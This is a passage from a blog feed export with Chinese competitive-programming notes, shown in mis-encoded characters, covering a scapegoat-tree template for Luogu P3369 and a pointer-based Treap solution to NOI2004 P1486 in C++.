class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> OI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Stack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ›¿ç½ªç¾Šæ ‘å­¦ä¹ ç¬”è®°</title>
      <link href="/2018/08/03/%E6%9B%BF%E7%BD%AA%E7%BE%8A%E6%A0%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2018/08/03/%E6%9B%BF%E7%BD%AA%E7%BE%8A%E6%A0%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>åšå®¢å’•å’•å’•äº†å¥½ä¹…â€¦â€¦æœ€è¿‘ä¼šé€æ­¥ç»§ç»­æ¢å¤æ›´æ–°åšå®¢çš„ã€‚<br>æœ€è¿‘åˆåœ¨å­¦ä¹ äºŒå‰æœç´¢æ ‘ã€‚å®æµ‹å‘ç°æ›¿ç½ªç¾Šæ ‘å¿«çš„é£èµ·(æ—¶é—´çº¦Splayçš„1&#x2F;2)~å†™èµ·æ¥è¿˜æ¯”è¾ƒç®€å•ï¼Œå†³å®šæ¥ä¸€æ³¢ã€‚<br>ï¼ˆé‚£ä¸ºä»€ä¹ˆè¿˜è¦ç”¨Splayå‘¢ï¼Ÿå› ä¸ºSplayæ˜¯åºåˆ—ä¹‹ç‹ï¼è¿˜èƒ½ç»´æŠ¤LCTï¼ï¼ˆä½ è¦ç”¨éæ—‹Treapï¼ˆFHQ-Treapï¼‰æˆ‘ä¹Ÿæ²¡æ„è§ï¼‰ï¼‰<br>æ›¿ç½ªç¾Šæ ‘çš„ä¸»è¦æ€æƒ³å°±æ˜¯å½“å‡ºç°é‡é‡å¤±è¡¡çš„æ—¶å€™ï¼Œ<strong>æŠŠç½ªé­ç¥¸é¦–çš„é‚£ä¸ªå­æ ‘æ‹å‡ºæ¥ï¼Œé‡æ–°æŒ‰æœ€å®Œç¾çš„æ–¹å¼ï¼ˆä¹Ÿå°±æ˜¯è¿‘ä¼¼å®Œå…¨äºŒå‰æ ‘ï¼‰æ„é€ ä¸€éå†æ¥å›å»</strong>ã€‚<br>å¦‚ä½•å®šä¹‰æŸä¸ªå­æ ‘ä¸å¹³è¡¡ï¼šå½“è¿™ä¸ªå­æ ‘çš„å·¦å³å­æ ‘å…¶ä¸­ä¹‹ä¸€çš„â€œé‡é‡â€ï¼ˆèŠ‚ç‚¹ä¸ªæ•°ï¼‰è¶…è¿‡äº†æ•´ä¸ªå­æ ‘çš„Î±*100%æ—¶ï¼Œæˆ‘ä»¬è®¤ä¸ºè¿™ä¸ªå­æ ‘ä¸å¹³è¡¡ã€‚<br>ä¸¾ä¾‹ï¼šÎ±&#x3D;0.75æ—¶ï¼Œå¦‚æœä¸€ä¸ªå­æ ‘å·¦å­æ ‘æœ‰4ä¸ªèŠ‚ç‚¹ï¼Œå³å­æ ‘æœ‰1ä¸ªï¼Œè¿™ä¸ªå­æ ‘å¤§å°å°±æ˜¯4+1+1&#x3D;6ï¼Œå·¦å­æ ‘å æ¯”è¶…è¿‡äº†Î±*100%ï¼ˆå³75%ï¼‰ï¼Œè¿™ä¸ªå­æ ‘ä¸å¹³è¡¡ï¼Œéœ€è¦é‡æ„ã€‚<br>æ˜¾ç„¶ï¼ŒÎ±å–å€¼ä»‹äº0.5è‡³1.0ä¹‹é—´ï¼Œè¶Šå°æ ‘è¶Šå¹³è¡¡ä½†é‡æ„æ¬¡æ•°è¶Šå¤šï¼Œè¶Šå¤§é‡æ„æ¬¡æ•°è¶Šå°‘ä½†æ ‘è¶Šä¸å¹³è¡¡ã€‚å¤ªå¤§å¤ªå°éƒ½ä¼šå‡ºäº‹ã€‚<strong>ä¸€èˆ¬è€Œè¨€ï¼ŒÎ±å–0.75</strong>ã€‚å¦‚æœé¢˜ç›®æŸ¥è¯¢æ¬¡æ•°è¿œå¤§äºæ’å…¥æ¬¡æ•°ï¼Œå¯ç•¥å¾®é™ä½Î±å–å€¼ï¼ˆæ¯”å¦‚Î±&#x3D;0.70ï¼‰ï¼›è‹¥è¿œå°äºï¼Œåˆ™ç•¥å‡é«˜ï¼ˆå¦‚Î±&#x3D;0.80ï¼‰ã€‚<br>ä¸‹é¢ä»¥<a href="https://www.luogu.org/problemnew/show/P3369">æ´›è°·3369ã€æ¨¡æ¿ã€‘æ™®é€šå¹³è¡¡æ ‘</a>ä¸ºä¾‹ï¼š  </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è¿™ä¸ªæ¿å­æœ‰æ”¹è¿›ä¹‹å¤„ï¼šæ¯”å¦‚åˆ é™¤èŠ‚ç‚¹å¯ä»¥æ‰“ä¸Šåˆ é™¤æ‡’æ ‡è®°ï¼Œå•ä¸ªèŠ‚ç‚¹å¯ä»¥è®°å½•åŒä¸€æ•°å­—æ•°é‡é¿å…å¤šä½™èŠ‚ç‚¹ã€‚</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> inf (1&lt;&lt;30)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> maxn (2100000)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> db double</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> il inline</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RG register</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> db al=<span class="number">0.75</span>;<span class="comment">//Î±</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span> &#123;</span><br><span class="line">    <span class="type">int</span> son[<span class="number">2</span>],fa,size,num;<span class="comment">//å·¦å³å­©å­å‚¨å­˜åœ°å€ï¼ŒèŠ‚ç‚¹çˆ¶äº²ï¼Œä»¥è¯¥èŠ‚ç‚¹ä¸ºæ ¹å­æ ‘çš„é‡é‡ï¼Œè¯¥èŠ‚ç‚¹å‚¨å­˜çš„æ•°å­—</span></span><br><span class="line">&#125; t[maxn];</span><br><span class="line"><span class="type">int</span> n,cnt,root;</span><br><span class="line"></span><br><span class="line"><span class="function">il <span class="type">bool</span> <span class="title">balance</span><span class="params">(RG <span class="type">int</span> id)</span>   <span class="comment">//åˆ¤æ–­å­æ ‘æ˜¯å¦å¹³è¡¡</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (db)(t[id].size*al&gt;=(db)t[ t[id].son[<span class="number">0</span>] ].size) &amp;&amp; (db)( t[id].size*al&gt;=(db)t[t[ id].son[<span class="number">1</span>] ].size);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> cur[maxn],sum;</span><br><span class="line"></span><br><span class="line"><span class="function">il <span class="type">void</span> <span class="title">recycle</span><span class="params">(RG <span class="type">int</span> id)</span>    <span class="comment">//å‹æ‰ï¼ŒæŠŠéœ€è¦é‡æ„çš„å­æ ‘æ‹å‡ºæ¥å…ˆæ‹æ‰æˆåºåˆ—</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(t[id].son[<span class="number">0</span>]) <span class="built_in">recycle</span>(t[id].son[<span class="number">0</span>]);</span><br><span class="line">    cur[++sum]=id;</span><br><span class="line">    <span class="keyword">if</span>(t[id].son[<span class="number">1</span>]) <span class="built_in">recycle</span>(t[id].son[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">il <span class="type">int</span> <span class="title">build</span><span class="params">(RG <span class="type">int</span> l,RG <span class="type">int</span> r)</span>   <span class="comment">//é€’å½’å»ºæ ‘ï¼Œä½¿ç»“æ„æœ€ä¼˜</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l&gt;r) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    RG <span class="type">int</span> mid=(l+r)&gt;&gt;<span class="number">1</span>,id=cur[mid];</span><br><span class="line">    t[ t[id].son[<span class="number">0</span>]=<span class="built_in">build</span>(l,mid<span class="number">-1</span>) ].fa=id;</span><br><span class="line">    t[ t[id].son[<span class="number">1</span>]=<span class="built_in">build</span>(mid+<span class="number">1</span>,r) ].fa=id;</span><br><span class="line">    t[id].size=t[ t[id].son[<span class="number">0</span>] ].size+t[ t[id].son[<span class="number">1</span>] ].size+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">il <span class="type">void</span> <span class="title">rebuild</span><span class="params">(RG <span class="type">int</span> id)</span>   <span class="comment">//é‡æ„å­æ ‘ï¼Œå†â€œæ¥å›å»â€</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    sum=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">recycle</span>(id);</span><br><span class="line">    RG <span class="type">int</span> fa=t[id].fa,Son=( t[ t[id].fa ].son[<span class="number">1</span>]==id );</span><br><span class="line">    RG <span class="type">int</span> cur=<span class="built_in">build</span>(<span class="number">1</span>,sum);</span><br><span class="line">    t[ t[fa].son[Son]=cur ].fa=fa;</span><br><span class="line">    <span class="keyword">if</span>(id==root) root=cur;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">il <span class="type">void</span> <span class="title">insert</span><span class="params">(RG <span class="type">int</span> x)</span><span class="comment">//æ’å…¥ä¸€ä¸ªæ•°å­—x</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    RG <span class="type">int</span> now=root,cur=++cnt;</span><br><span class="line">    t[cur].size=<span class="number">1</span>,t[cur].num=x;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123; <span class="comment">//æ‰¾åˆ°é€‚åˆä½ç½®æ’å…¥</span></span><br><span class="line">        t[now].size++;</span><br><span class="line">        RG <span class="type">bool</span> Son=(x&gt;=t[now].num);</span><br><span class="line">        <span class="keyword">if</span>( t[now].son[Son] ) now=t[now].son[Son];</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            t[ t[now].son[Son]=cur ].fa=now;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    RG <span class="type">int</span> flag=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(RG <span class="type">int</span> i=cur; i; i=t[i].fa) <span class="keyword">if</span>(!<span class="built_in">balance</span>(i)) flag=i;<span class="comment">//æ³¨æ„ï¼šé‡å»ºæ—¶å–æ·±åº¦æœ€æµ…çš„ï¼Œä»¥é¿å…å°å­æ ‘é‡æ„å®Œå¤§å­æ ‘è¿˜é‡æ„ï¼Œæµªè´¹æ—¶é—´</span></span><br><span class="line">    <span class="keyword">if</span>(flag) <span class="built_in">rebuild</span>(flag); <span class="comment">//æ’å…¥å¾€å¾€ä¼šå¯¼è‡´ä¸å¹³è¡¡,è¿™æ—¶éœ€è¦é‡å»ºä¸å¹³è¡¡çš„å­æ ‘å³å¯</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">il <span class="type">int</span> <span class="title">get_num</span><span class="params">(RG <span class="type">int</span> x)</span>   <span class="comment">//æŸ¥è¯¢ x åœ¨æ ‘ä¸­çš„èŠ‚ç‚¹ç¼–å·ï¼ˆåœ¨æ•°ç»„ä¸­å‚¨å­˜ä½ç½®ä¸‹æ ‡ï¼‰</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    RG <span class="type">int</span> now=root;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(t[now].num==x) <span class="keyword">return</span> now;</span><br><span class="line">        <span class="keyword">else</span> now=t[now].son[ t[now].num&lt;x ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">il <span class="type">void</span> <span class="title">erase</span><span class="params">(RG <span class="type">int</span> id)</span>   <span class="comment">//åˆ é™¤</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(t[id].son[<span class="number">0</span>] &amp;&amp; t[id].son[<span class="number">1</span>]) &#123;</span><br><span class="line">        RG <span class="type">int</span> cur=t[id].son[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">while</span>(t[cur].son[<span class="number">1</span>]) cur=t[cur].son[<span class="number">1</span>];</span><br><span class="line">        t[id].num=t[cur].num;</span><br><span class="line">        id=cur;</span><br><span class="line">    &#125; <span class="comment">//åˆ é™¤æ“ä½œéœ€è¦æ‰¾åˆ°å·¦å­æ ‘çš„æœ€åä¸€ä¸ªèŠ‚ç‚¹æˆ–å³å­æ ‘çš„ç¬¬ä¸€ä¸ªèŠ‚ç‚¹æ¥é¡¶æ›¿,ä¼˜å…ˆæ‰¾å·¦å­æ ‘</span></span><br><span class="line">    RG <span class="type">int</span> Son=(t[id].son[<span class="number">0</span>]) ? t[id].son[<span class="number">0</span>]:t[id].son[<span class="number">1</span>];</span><br><span class="line">    RG <span class="type">int</span> k=( t[ t[id].fa ].son[<span class="number">1</span>]==id );</span><br><span class="line">    t[ t[ t[id].fa ].son[k]=Son ].fa=t[id].fa;</span><br><span class="line">    <span class="keyword">for</span>(RG <span class="type">int</span> i=t[id].fa; i; i=t[i].fa) t[i].size--;</span><br><span class="line">    <span class="keyword">if</span>(id==root) root=Son;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">il <span class="type">int</span> <span class="title">get_rank</span><span class="params">(RG <span class="type">int</span> x)</span>   <span class="comment">//æŸ¥ x çš„æ’å</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    RG <span class="type">int</span> now=root,ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(now) &#123;</span><br><span class="line">        <span class="keyword">if</span>(t[now].num&lt;x) ans+=t[ t[now].son[<span class="number">0</span>] ].size+<span class="number">1</span>,now=t[now].son[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">else</span> now=t[now].son[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">il <span class="type">int</span> <span class="title">get_kth</span><span class="params">(RG <span class="type">int</span> x)</span>   <span class="comment">//æŸ¥æ ‘ä¸­çš„ç¬¬ k ä¸ªæ•°</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    RG <span class="type">int</span> now=root;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(t[ t[now].son[<span class="number">0</span>] ].size==x<span class="number">-1</span>) <span class="keyword">return</span> now;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(t[ t[now].son[<span class="number">0</span>] ].size&gt;=x) now=t[now].son[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">else</span> x-=t[ t[now].son[<span class="number">0</span>] ].size+<span class="number">1</span>,now=t[now].son[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> now;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cnt=<span class="number">2</span>,root=<span class="number">1</span>;</span><br><span class="line">    t[<span class="number">1</span>].num=-inf,t[<span class="number">1</span>].size=<span class="number">2</span>,t[<span class="number">1</span>].son[<span class="number">1</span>]=<span class="number">2</span>;</span><br><span class="line">    t[<span class="number">2</span>].num=inf,t[<span class="number">2</span>].size=<span class="number">1</span>,t[<span class="number">2</span>].fa=<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    RG <span class="type">int</span> type,x;</span><br><span class="line">    <span class="keyword">for</span>(RG <span class="type">int</span> i=<span class="number">1</span>; i&lt;=n; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;type,&amp;x);</span><br><span class="line">        <span class="keyword">if</span>(type==<span class="number">1</span>) <span class="built_in">insert</span>(x);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(type==<span class="number">2</span>) <span class="built_in">erase</span>( <span class="built_in">get_num</span>(x) );</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(type==<span class="number">3</span>) <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">get_rank</span>(x));</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(type==<span class="number">4</span>) <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,t[ <span class="built_in">get_kth</span>(x+<span class="number">1</span>) ].num);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(type==<span class="number">5</span>) <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,t[<span class="built_in">get_kth</span>(<span class="built_in">get_rank</span>(x))].num);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(type==<span class="number">6</span>) <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,t[<span class="built_in">get_kth</span>(<span class="built_in">get_rank</span>(x+<span class="number">1</span>)+<span class="number">1</span>)].num);<span class="comment">//æ³¨æ„æ­¤å¤„ </span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> OI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Treap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ´›è°·:P1486 [NOI2004]éƒé—·çš„å‡ºçº³å‘˜</title>
      <link href="/2018/04/09/%E6%B4%9B%E8%B0%B7P1486%20%5BNOI2004%5D%E9%83%81%E9%97%B7%E7%9A%84%E5%87%BA%E7%BA%B3%E5%91%98/"/>
      <url>/2018/04/09/%E6%B4%9B%E8%B0%B7P1486%20%5BNOI2004%5D%E9%83%81%E9%97%B7%E7%9A%84%E5%87%BA%E7%BA%B3%E5%91%98/</url>
      
        <content type="html"><![CDATA[<p>åŸé¢˜åœ°å€:<a href="https://www.luogu.org/problemnew/show/P1486">https://www.luogu.org/problemnew/show/P1486</a>  </p><h3 id="é¢˜ç›®ç®€è¿°"><a href="#é¢˜ç›®ç®€è¿°" class="headerlink" title="é¢˜ç›®ç®€è¿°"></a>é¢˜ç›®ç®€è¿°</h3><p>ä¸€ä¸ªåºåˆ—aï¼Œåˆå§‹ä¸ºç©ºã€‚<br>éšæ—¶æ’å…¥ä¸€ä¸ªæ•°ï¼ŒæŸ¥è¯¢ç¬¬kå¤§ï¼Œå…¨ä½“åŠ ï¼Œå…¨ä½“å‡ã€‚<br>ä½†æ˜¯å¦‚æœä»»ä½•æ•°åœ¨ä»»ä½•æ—¶åˆ»ä½äºç»™å®šçš„ä¸‹ç•ŒMINï¼Œåˆ™ç«‹å³ç§»é™¤å‡ºåºåˆ—ã€‚</p><hr><h3 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h3><p>æ’å…¥ï¼ŒæŸ¥è¯¢ç¬¬kå¤§ï¼Œå®¹æ˜“å‘ç°æ˜¯BSTé¢˜ã€‚äºæ˜¯ä¸ŠTreapã€‚<br>å…¨ä½“åŠ å…¨ä½“å‡æš´åŠ›åŠ è‚¯å®šä¸è¡Œï¼Œè€ƒè™‘ç”¨å˜é‡deltaå‚¨å­˜å˜åŒ–æƒ…å†µã€‚å…¨ä½“åŠ nå°±æ˜¯delta+&#x3D;nï¼ˆnä¸ºè´Ÿå°±æ˜¯å‡ï¼‰<br>äºæ˜¯æ¯ä¸ªæ•°å®é™…çš„å€¼æ˜¯ï¼šæ ‘é‡Œå‚¨å­˜è¯¥æ•°çš„å€¼+delta  â€”â€”â‘ <br>å‡äº†ä¹‹åå¯èƒ½ä¼šæœ‰æ•°ä½äºä¸‹ç•Œï¼ŒæŸ¥æ‰¾æœ€å°çš„æ•°åˆ¤æ–­æ˜¯ä¸æ˜¯å°äºMINï¼Œæ˜¯çš„è¯åˆ é™¤ï¼Œé‡å¤ç›´åˆ°ä¸å†å°äºMINã€‚<br>æ³¨æ„æ–°æ’å…¥çš„æ•°ä¸åº”è¯¥å—ä¹‹å‰çš„åŠ å‡å½±å“ï¼Œæ‰€ä»¥å°†ä¸€ä¸ªæ•°å­—numæ’å…¥æ ‘ä¸­æ—¶ï¼Œå¦‚æœç›´æ¥æŠŠnumæ’å…¥æ ‘ä¸­ï¼Œå°±å˜æˆnum+deltaäº†ã€‚<br>å®é™…åº”è¯¥æ’å…¥çš„æ˜¯num-deltaï¼Œè¿™æ ·ç»“åˆä¸Šæ–‡â‘ ï¼Œç°åœ¨è¿™ä¸ªæ•°å®é™…çš„å€¼å°±æ˜¯numæœ¬èº«äº†ã€‚<br>æä¾›ä¸€ä¸ªæŒ‡é’ˆå®ç°çš„Treapï¼Œä¸æ¨èä½¿ç”¨å…¶å®ï¼Œè°ƒçš„æ—¶å€™å¿«æŠŠæˆ‘æåè¡€ã€‚</p><hr><h3 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line">    <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line">    <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line">    <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line">    <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctime&gt;</span></span></span><br><span class="line">    <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cctype&gt;</span></span></span><br><span class="line">    <span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> MAXN=<span class="number">200010</span>;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Node</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> d,rnd,size;</span><br><span class="line">        Node *ch[<span class="number">2</span>],*pa;</span><br><span class="line">    &#125;pool[MAXN],*root;</span><br><span class="line">    <span class="type">int</span> tot=<span class="number">0</span>;</span><br><span class="line">    <span class="function">Node *<span class="title">newnode</span><span class="params">(<span class="type">int</span> d)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Node *p=&amp;pool[++tot];</span><br><span class="line">        p-&gt;d=d;p-&gt;rnd=<span 